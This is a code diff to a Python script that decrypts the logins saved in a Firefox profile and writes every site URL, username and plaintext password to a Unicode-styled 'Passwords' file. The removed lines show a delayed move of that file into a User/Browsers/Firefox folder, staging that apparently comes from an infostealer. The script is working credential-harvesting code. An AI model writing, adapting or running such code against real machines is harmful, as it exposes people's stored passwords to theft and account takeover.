@@ -20,6 +20,7 @@ from struct import unpack;from binascii import hexlify,unhexlify
 from rich.console import Console;from rich.table import Table;from rich.theme import Theme
 from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
 from time import sleep,localtime
+
 if os.name=='nt':pass
 
 def getShortLE(d, a):
@@ -305,37 +306,18 @@ intro = """
    
 ╚════════════════════════════════════════════════╝
 """ 
-if os.path.exists('Passwords.txt'):
-    os.remove('Passwords.txt')
+if os.path.exists('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt'):
+    os.remove('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt')
     
-with open('Passwords.txt', 'w', encoding="utf-8") as f:
+with open('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt', 'w', encoding="utf-8") as f:
     f.write(intro + "\n")
     for i in logins:
         assert i[0][0] == CKA_ID
         f.write('𝐔𝐑𝐋: %s\n' % i[2])
-        
         iv = i[0][1]
         ciphertext = i[0][2]
         f.write('𝐔𝐬𝐞𝐫: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
         iv = i[1][1]
         ciphertext = i[1][2]
         f.write('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
-        f.write('\n')
-
-import os
-import shutil
-import time
-
-download_folder = os.path.join(os.path.expanduser("~"), 'Downloads', 'R')
-
-source_path = os.path.join(download_folder, 'Passwords.txt')
-
-firefox_folder = os.path.join(os.path.expanduser("~"), '𝐔𝐬𝐞𝐫', '𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬', '𝐅𝐢𝐫𝐞𝐟𝐨𝐱')
-destination_path = os.path.join(firefox_folder, 'Passwords.txt')
-
-if not os.path.exists(firefox_folder):
-    os.makedirs(firefox_folder)
-
-time.sleep(10)
-
-shutil.move(source_path, destination_path)
+        f.write('\n') 
